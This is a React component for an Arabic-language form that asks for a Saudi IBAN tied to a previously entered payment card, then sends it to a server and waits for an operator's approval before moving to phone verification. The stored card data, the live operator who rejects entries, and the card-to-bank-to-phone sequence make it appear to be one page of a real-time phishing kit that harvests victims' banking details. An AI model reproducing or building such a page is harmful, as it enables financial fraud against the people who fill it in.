import Main from "@/components/Main";
import { isFormRejected } from "@/real-time/context/signals";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import Button from "@mui/material/Button";
import FormControl from "@mui/material/FormControl";
import OutlinedInput from "@mui/material/OutlinedInput";
import Stack from "@mui/material/Stack";
import { useEffect } from "react";
import { FieldValues, useForm } from "react-hook-form";
import PaymentCardDetails from "@/components/PaymentCardDetails";

function IBAN() {
  const {
    register,
    handleSubmit,
    reset,
    formState: { isValid, errors },
    setValue,
  } = useForm({
    mode: "onChange",
    defaultValues: {
      IBAN: "",
    },
  });

  function sendData(data: FieldValues) {
    sendDataToServer({
      data,
      current: "رقم الحساب البنكي",
      nextPage: "توثيق رقم الجوال",
      waitingForAdminResponse: true,
    });
  }

  useEffect(() => setCurrentPage("رقم الحساب البنكي"), []);

  useEffect(() => {
    if (isFormRejected.value) {
      reset();
    }
  }, [isFormRejected.value]);

  const { cardLast4 } = JSON.parse(localStorage.getItem("payment") || "{}");

  return (
    <Main>
      <form
        className="flex flex-col flex-1 gap-8 w-full"
        onSubmit={handleSubmit(sendData)}
      >
        <div className="top">
          <div className="flex flex-col items-center gap-5">
            <h2 className="font-bold text-xl"> رقم الحساب البنكي (IBAN)</h2>
            <h2 className="font-semibold text-xl">تأكيد رقم الحساب البنكي</h2>
          </div>
          <PaymentCardDetails />
          <p className="mt-6 font-semibold text-black">
            يرجى إدخال رقم الحساب البنكي (IBAN) المرتبط بالبطاقة المنتهية بـ{" "}
            <b>{cardLast4}</b> لاستكمال العملية والتحقق من صحة البيانات.
          </p>
        </div>

        <FormControl fullWidth>
          <OutlinedInput
            sx={{ textAlign: "center" }}
            dir="ltr"
            {...register("IBAN", {
              required: "رمز IBAN مطلوب",
              validate: (value) => {
                const iban = value.replace(/\s+/g, "").toUpperCase();
                const saIbanRegex = /^SA\d{22}$/;
                if (!saIbanRegex.test(iban)) {
                  return "الـ IBAN يجب أن يبدأ بـ SA ويتكون من 24 رقمًا وحرفًا فقط";
                }
                return true;
              },
            })}
            onChange={(e) => {
              const formatted = e.target.value
                .toUpperCase()
                .replace(/[^A-Z0-9]/g, "")
                .replace(/(.{4})/g, "$1 ")
                .trim();
              setValue("IBAN", formatted, { shouldValidate: true });
            }}
            inputProps={{ maxLength: 29 }}
            type="text"
            name="IBAN"
            id="IBAN"
            placeholder="SA03 8000 0000 6080 1016 7519"
          />
        </FormControl>

        {errors.IBAN && (
          <Stack className="font-medium mt-3 text-red-500 text-center">
            {errors.IBAN.message as string}
          </Stack>
        )}

        {isFormRejected.value && (
          <Stack className="font-medium mt-3 text-red-500 text-center">
            الـ IBAN غير صحيح، يرجى المحاولة مرة أخرى.
          </Stack>
        )}

        <Stack
          className="form-bottom"
          direction="row"
          justifyContent="end"
          alignItems="center"
          mt="24px"
          mb="5px"
        >
          <Button
            fullWidth
            variant="contained"
            disabled={!isValid}
            type="submit"
            size="large"
          >
            تأكيد
          </Button>
        </Stack>
      </form>
    </Main>
  );
}

export default IBAN;
